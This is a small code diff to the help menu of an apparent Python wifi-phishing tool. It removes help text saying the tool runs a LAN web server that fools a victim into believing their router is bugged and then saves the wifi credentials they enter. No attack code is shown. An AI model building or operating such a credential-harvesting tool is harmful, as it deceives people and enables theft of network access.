@@ -197,9 +197,6 @@ def __main__():
 
         flaskapp()
     elif(main == "help"):
-        print("This program starts a Local Web Server on your LAN. You can fool someone into thinking your Router is Bugged and make them Link their wifi.")
-        print("Their Wifi is not being linked but as soon as they Enter Wifi Credentials they will be saved giving you their Wifi.")
-        print("When the Process is Done. Type show_log in Main Menu to check if Credentials arrived.")
         print(Fore.LIGHTCYAN_EX + "Commands : ")
         print("- start - Start Lan Server.")
         print("- exit - Exit.")
